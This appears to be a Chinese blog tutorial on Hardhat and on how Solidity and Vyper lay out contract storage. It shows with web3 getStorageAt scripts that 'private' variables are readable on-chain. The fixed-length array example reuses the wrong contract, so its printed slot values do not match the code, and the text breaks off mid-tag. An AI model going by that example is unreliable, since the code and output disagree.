<img src="/smart-contract-note/hardhat%E5%8F%AF%E8%83%BD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="hardhat可能的目录结构">
<figcaption aria-hidden="true">hardhat可能的目录结构</figcaption>
</figure>
<p>其中</p>
<ul>
<li><code>artifacts</code>
<ul>
<li>包含的是合约编译后的结果，在
<code>artifacts/contracts/name.vy/name.json</code> 中，其中
<code>name.vy</code> 与合约文件同名。</li>
<li>json 中主要包含
<ul>
<li><code>contractName</code> - 带有合约名称的字符串</li>
<li><code>abi</code> - 合约的 ABI JSON</li>
<li><code>bytecode</code> -
合约未部署的字节码（即<strong>包含</strong>构造函数），如果编译失败结果为
"0x"</li>
<li><code>deployedBytecode</code> -
合约部署后的字节码（即<strong>不包含</strong>构造函数），如果编译失败结果为
"0x"</li>
<li><code>linkReferences</code> - 未部署字节码的引用对象，由
<code>solc</code> 提供</li>
<li><code>deployedLinkReferences</code> - 部署字节码的引用对象，由
<code>solc</code> 提供</li>
</ul></li>
</ul></li>
<li><code>contracts</code>
<ul>
<li>存放合约代码，在这个文件夹下的代码都会被 Hardhat
自动编译（运行任务时）</li>
</ul></li>
<li><code>scripts</code>
<ul>
<li>规范性的存放 <code>ts</code> 脚本的文件夹</li>
</ul></li>
<li><code>test</code>
<ul>
<li>存放测试脚本的文件夹，主要由 Mocha 代码，内置任务 <code>test</code>
会自动运行其中的所有测试</li>
</ul></li>
</ul>
<p>Hardhat 以任务驱动为主，运行方式是
<code>npx hardhat &lt;task name&gt;</code>。</p>
<p><code>compile</code>
是一个内置的任务，用于编译合约，一个可能的运行结果为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ npx hardhat compile</span><br><span class="line">Nothing to compile</span><br><span class="line">No need to generate any newer typings.</span><br><span class="line">Vyper compilation finished successfully</span><br></pre></td></tr></table></figure>
<p><code>test</code>
同样是一个内置的任务，用于自动化测试，（如果可以的话）会自动运行存放在
<code>test</code> 文件夹下的所有脚本。</p>
<p><code>run</code>
用于直接运行脚本，与任务不同，任务会预先导入一些必要环境，而
<code>run</code> 不会，需要手动导入甚至需要手动编写某些复杂的部分。</p>
<p>可以通过 <code>npx hardhat</code> 的命令获取所有可运行的任务。</p>
<h4 id="任务">任务</h4>
<p>其中 Hardhat 最重要的功能在于自定义任务，使得合约测试流程简化。</p>
<p>一般任务在 <code>hardhat.config.ts</code> 中编写，从
<code>hardhat/config</code> 导入
<code>task</code>，一个最简单的任务是</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">task</span>(<span class="string">&quot;example&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这样就定义了一个名字叫 <code>example</code> 的任务，此时通过
<code>npx hardhat</code> 可以看到可运行的任务中出现了
<code>example</code>。</p>
<p>但别的任务都有描述，所以我们也需要一个描述</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">task</span>(<span class="string">&quot;example&quot;</span>, <span class="string">&quot;这是一个示例&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>有了描述后，我们想让任务做些什么，这时候需要一个动作（Action）</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">task</span>(<span class="string">&quot;example&quot;</span>, <span class="string">&quot;这是一个示例&quot;</span>).<span class="title function_">setAction</span>(<span class="keyword">async</span> (_, &#123; web3 &#125;) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [deployer, ] = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getAccounts</span>()</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(deployer)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这样一个最简单的任务就编写完成了，更多的可以参考<a target="_blank" rel="noopener" href="https://hardhat.org/hardhat-runner/docs/advanced/create-task">官方文档</a>。</p>
<h2 id="陷阱">陷阱</h2>
<h3 id="隐私性">隐私性</h3>
<h4 id="所谓private">所谓private</h4>
<p>EVM 是面向合约的，其中的合约可以被视为另一种意义上的对象。</p>
<p>对于一个已部署的合约，其状态在以太坊网络的存储是可见的，类似于计算机内存中对象的数据可见性。</p>
<p>然而，需要注意的是，以太坊中的智能合约存储的可见性仅针对于 EVM
外部。在 EVM
内部，有严格的执行要求阻止合约之间访问其他合约的内部属性。</p>
<blockquote>
<p>特别地，Vyper 和 Solidity 针对于 public 属性会默认编译其 getter
方法便于外部访问。</p>
</blockquote>
<p>比如说 Vyper 代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">qsdz: uint256</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">    self.qsdz = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@pure</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() -&gt; String[<span class="number">32</span>]:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;world&quot;</span></span><br></pre></td></tr></table></figure>
<p>使用 Remix 部署合约，可以看见 <code>qsdz</code> 属性是没有 getter
方法的。</p>
<figure>
<img src="/smart-contract-note/private_member.png" alt="private_member">
<figcaption aria-hidden="true">private_member</figcaption>
</figure>
<blockquote>
<p>需要注意的是，不知道是否是 Remix
的原因，需要与合约进行过一次交易后才可以获取到存储。</p>
</blockquote>
<p>但是我们可以通过 web3js 框架在外部与区块链交互，获取合约的存储。</p>
<p>在这里演示使用 Remix 注入脚本的方式执行</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xf8e81D47203A594245E36C48e151709F0C19fBe8&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> slot = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, <span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;slot:&quot;</span>, slot)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>可以获得回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slot:</span><br><span class="line">0x01e240</span><br></pre></td></tr></table></figure>
<p>请不要在区块链上存储敏感信息。</p>
<h4 id="存储插槽">存储插槽</h4>
<p>在 EVM 中，每个合约都有专属于自己的存储（storage），合约存储被分为
<span class="math inline">\(2^{256}\)</span> 个插槽（slot），每个插槽 32
字节（256位，相当于 uint256），插槽是连续分布的，可以由索引引用。</p>
<blockquote>
<p>需要注意的是，虽然理论上如此，但实际上编译时会对合约变量进行空间上的优化，使得存储成本更小。</p>
</blockquote>
<blockquote>
<p>无论对于 Solidity 还是 Vyper，<code>constant</code>
都将作为编译期常量。</p>
</blockquote>
<h4 id="solidity">Solidity</h4>
<h5 id="规则">规则</h5>
<blockquote>
<p>官方说明：<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/zh/v0.8.20/internals/layout_in_storage.html">https://docs.soliditylang.org/zh/v0.8.20/internals/layout_in_storage.html</a></p>
</blockquote>
<p>合约的状态变量以一种紧凑的方式存储，
这样多个值有时会使用同一个存储槽。
<strong>除了动态大小的数组和映射之外</strong>，
数据是被逐项存储的，从第一个状态变量开始， 它被存储在槽 <code>0</code>
中。</p>
<p>对于每个变量，
根据它的类型确定一个字节的大小。如果可能的话，需要少于32字节的多个连续项目被打包到一个存储槽中，
根据以下规则：</p>
<ul>
<li>存储插槽的第一项会以低位对齐（即右对齐）的方式储存。</li>
<li>值类型只使用存储它们所需的字节数。</li>
<li>如果一个值类型不适合一个存储槽的剩余部分，它将被存储在下一个存储槽。</li>
<li>结构和数组数据总是从一个新的存储槽开始，它们的项根据这些规则被紧密地打包。</li>
<li>结构或数组数据之后的变量总是开辟一个新的存储槽。</li>
</ul>
<h5 id="存储紧缩">存储紧缩</h5>
<p>可以尝试以下测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    uint128 private qsdz;</span><br><span class="line">    uint128 private yyds;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        qsdz = 0x000102030405;</span><br><span class="line">        yyds = 0x101112131415;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hello() external pure returns (string memory) &#123;</span><br><span class="line">        return &quot;world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取索引为 0 的插槽得到回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slot:</span><br><span class="line">0x10111213141500000000000000000000000102030405</span><br></pre></td></tr></table></figure>
<h5 id="定长数组类型">定长数组类型</h5>
<p>对于<strong>定长数组类型</strong>，相当于连续存储的值类型。</p>
<p>可以尝试以下测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    uint128 private qsdz;</span><br><span class="line">    uint128 private yyds;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        qsdz = 0x000102030405;</span><br><span class="line">        yyds = 0x101112131415;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hello() external pure returns (string memory) &#123;</span><br><span class="line">        return &quot;world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别获取索引为 0、1、2 的插槽，得到结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">slot:</span><br><span class="line">0x0200000000000000000000000000000000</span><br><span class="line">slot:</span><br><span class="line">0x0600000000000000000000000000000004</span><br><span class="line">slot:</span><br><span class="line">0x08</span><br></pre></td></tr></table></figure>
<h5 id="不定长数组类型">不定长数组类型</h5>
<p>对于<strong>不定长数组类型</strong>，插槽存储数组大小，但数组数据从
<code>keccak256(position)</code> 开始，其中 <code>position</code>
是插槽索引，排列顺序与定长数组类型一样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    uint128[] private qsdz;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        qsdz = new uint128[](5);</span><br><span class="line">        for (uint128 i = 0; i &lt; qsdz.length; i++) &#123;</span><br><span class="line">            qsdz[i] = 2 * i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hello() external pure returns (string memory) &#123;</span><br><span class="line">        return &quot;world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个可能的 ts 代码如下</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8&#x27;</span></span><br><span class="line">    <span class="comment">// 数组变量所在的插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> slotNumber = <span class="number">0</span></span><br><span class="line">    <span class="comment">// 这是数组的偏移量</span></span><br><span class="line">    <span class="keyword">const</span> offset = <span class="title class_">BigInt</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">const</span> length = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, slotNumber)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;length:&quot;</span>, length)</span><br><span class="line">    <span class="comment">// 计算得到的数组数据插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> idx = <span class="title class_">BigInt</span>(web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(&#123;<span class="attr">type</span>: <span class="string">&quot;uint&quot;</span>, <span class="attr">value</span>: slotNumber&#125;)) + offset</span><br><span class="line">    <span class="comment">// 插槽内容</span></span><br><span class="line">    <span class="keyword">const</span> arraySlot = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, <span class="string">&quot;0x&quot;</span> + idx.<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arraySlot)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<h5 id="映射类型">映射类型</h5>
<p>对于<strong>映射类型</strong>，插槽本身没有内容，对于每一个键
<code>key</code>，其值存储在
<code>keccak256(h(key)+position)</code>，其中 <code>position</code>
是插槽索引，<code>+</code> 表拼接，<code>h</code>
是与键的类型有关的映射函数。</p>
<ul>
<li>对于值类型， 函数 <code>h</code>
将与在内存中存储值的相同方式（<code>encodePacked</code>）来将值填充为32字节。</li>
<li>对于字符串和字节数组， <code>h(k)</code> 只是未填充的数据。</li>
</ul>
<p>实际上仅需使用 <code>web3.utils.soliditySha3</code>
函数即可获取插槽索引。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    mapping (uint256 =&gt; bytes32) private qsdz;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        qsdz[12345] = &quot;yyds&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hello() external pure returns (string memory) &#123;</span><br><span class="line">        return &quot;world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个可能的 ts 代码如下</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xd9145CCE52D386f254917e481eB44e9943F39138&#x27;</span></span><br><span class="line">    <span class="comment">// 这是映射键的值</span></span><br><span class="line">    <span class="keyword">const</span> key = <span class="number">12345</span></span><br><span class="line">    <span class="comment">// 映射变量所在的插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> slotNumber = <span class="number">0</span></span><br><span class="line">    <span class="comment">// 计算映射值的插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> idx = web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(&#123;<span class="attr">type</span>: <span class="string">&quot;uint256&quot;</span>, <span class="attr">value</span>: key&#125;,</span><br><span class="line">                                        &#123;<span class="attr">type</span>: <span class="string">&quot;uint&quot;</span>, <span class="attr">value</span>:slotNumber&#125;)</span><br><span class="line">    <span class="keyword">const</span> slot = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, idx)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(slot)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<h5 id="bytes-和-string">bytes 和 string</h5>
<p><code>bytes</code>
类型用来存储任意字节序列，不做编码假设。在存储时，它们以原始的字节序列形式存储。</p>
<p><code>string</code> 类型用来存储 UTF-8 编码的 Unicode
字符序列。在存储时，字符串会被转换为 UTF-8
编码的字节序列，并以这种形式存储。</p>
<p>所以本质上它们并无不同，仅仅和编译解析有关。</p>
<p>如果数据最多只有 <code>31</code> 字节长，
元素被存储在高阶字节中（左对齐），最低阶字节存储值
<code>length * 2</code>。 对于存储数据长度为 <code>32</code>
或更多字节的字节数，插槽存储 <code>length * 2 + 1</code>，
数据照常存储在 <code>keccak256(position)</code>。</p>
<blockquote>
<p>这意味着可以通过检查最低位是否被设置来区分短数组和长数组：
短数组（未设置）和长数组（设置）。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    bytes private qsdz;</span><br><span class="line">    bytes private yyds;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        qsdz = &quot;01234567890123456789&quot;;</span><br><span class="line">        yyds = &quot;0123456789012345678901234567890123456789&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hello() external pure returns (string memory) &#123;</span><br><span class="line">        return &quot;world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个可能的 ts 代码如下</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xd9145CCE52D386f254917e481eB44e9943F39138&#x27;</span></span><br><span class="line">    <span class="comment">// 变量所在的插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> slotNumber = <span class="number">1</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">slot</span>: <span class="built_in">string</span> = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, slotNumber)</span><br><span class="line">    <span class="keyword">const</span> slotValue = <span class="title class_">BigInt</span>(slot)</span><br><span class="line">    <span class="keyword">const</span> lengthMask = <span class="title class_">Number</span>(slotValue &amp; <span class="title class_">BigInt</span>(<span class="number">0xff</span>))</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">value</span>: <span class="built_in">string</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (lengthMask % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 短数组处理</span></span><br><span class="line">        <span class="keyword">const</span> data = slot.<span class="title function_">slice</span>(<span class="number">0</span>, lengthMask + <span class="number">2</span>)</span><br><span class="line">        value = web3.<span class="property">utils</span>.<span class="title function_">hexToString</span>(data)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 长数组处理</span></span><br><span class="line">        <span class="keyword">let</span> length = (lengthMask - <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">let</span> idx = web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(&#123;<span class="attr">type</span>: <span class="string">&quot;uint&quot;</span>, <span class="attr">value</span>: slotNumber&#125;)</span><br><span class="line">        <span class="comment">// 按定长数组方式提取数据</span></span><br><span class="line">        <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, idx)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">            value += web3.<span class="property">utils</span>.<span class="title function_">hexToString</span>(data)</span><br><span class="line">            length -= <span class="number">32</span></span><br><span class="line">            <span class="comment">// 迭代插槽索引</span></span><br><span class="line">            idx = <span class="title class_">BigInt</span>(idx)</span><br><span class="line">            ++idx</span><br><span class="line">            idx = <span class="string">&quot;0x&quot;</span> + idx.<span class="title function_">toString</span>(<span class="number">16</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(idx)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<h4 id="vyper">Vyper</h4>
<p>与 Solidity 不同的是，Vyper
暂时还未做出存储紧缩的优化，一个值至少占用一个槽。</p>
<blockquote>
<p>即使是 <code>struct</code> 也不会进行存储紧缩。</p>
</blockquote>
<h5 id="定长数组类型-1">定长数组类型</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">ARRAY_LENGTH: constant(uint256) = <span class="number">5</span></span><br><span class="line">qsdz: uint128[ARRAY_LENGTH]</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ARRAY_LENGTH):</span><br><span class="line">        self.qsdz[i] = convert(i * <span class="number">2</span> + <span class="number">1</span>, uint128)</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@pure</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() -&gt; String[<span class="number">32</span>]:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;world&quot;</span></span><br></pre></td></tr></table></figure>
<p>一个可能的 ts 代码如下</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xd9145CCE52D386f254917e481eB44e9943F39138&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">slot</span>: <span class="built_in">string</span> = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, <span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;slot&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(slot)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在这里本人出现了一点错误，如果索引值为 0 的插槽值为 0 会导致
<code>getStorageAt</code> 阻塞，暂时未了解原因。</p>
</blockquote>
<h5 id="bytes-和-string-1">Bytes 和 String</h5>
<p>特别地，在 Vyper 里，Bytes 和 String
必须是定长数组，存储至少需要两个插槽，前一个插槽存储字符串（字节流）大小，之后存储字符串（字节流）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">qsdz: String[<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">    self.qsdz = <span class="string">&quot;yyds&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@pure</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() -&gt; String[<span class="number">32</span>]:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;world&quot;</span></span><br></pre></td></tr></table></figure>
<p>一个可能的 ts 代码如下</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> length = <span class="title class_">BigInt</span>(<span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, <span class="number">0</span>))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;length:&quot;</span>, length)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, <span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title 